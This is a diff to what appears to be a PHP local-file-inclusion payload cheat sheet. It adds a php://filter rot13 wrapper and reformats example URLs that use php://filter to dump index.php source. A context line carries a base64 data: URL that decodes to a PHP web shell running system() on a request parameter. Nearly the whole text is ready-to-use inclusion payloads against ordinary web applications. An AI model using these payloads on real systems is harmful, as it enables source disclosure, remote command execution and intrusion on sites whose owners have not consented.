@@ -104,10 +104,14 @@ http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7
 ```
 php://filter/convert.base64-encode/resource=
 ```
+```
+php://filter/read=string.rot13/resource=
+```
 *example input:*
 
-http://example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php
-http://example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php
+example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php
+
+example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php
 
 *example output:*
 
